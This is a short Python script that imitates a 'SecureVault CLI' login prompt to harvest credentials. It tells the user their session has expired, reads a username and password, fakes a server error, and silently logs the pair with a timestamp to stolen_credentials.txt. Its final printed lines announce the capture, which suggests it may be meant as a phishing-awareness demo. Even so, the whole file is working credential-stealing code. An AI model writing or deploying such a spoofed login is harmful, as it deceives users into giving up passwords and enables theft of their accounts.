import getpass
import time
import datetime

def fake_login():
    print("=== SecureVault CLI ===")
    print("Session expired. Please login again.\n")

    username = input("Username: ")
    password = getpass.getpass("Password: ")

    print("\nLogging in...")
    time.sleep(2)

    print("\n❌ Error: Server unavailable. Please try again later.")

    # Save stolen credentials
    with open("stolen_credentials.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} | {username}:{password}\n")

    print("\n⚠️ Credentials captured by attacker!")
    print("Stolen Username:", username)
    print("Stolen Password:", password)

if __name__ == "__main__":
    fake_login()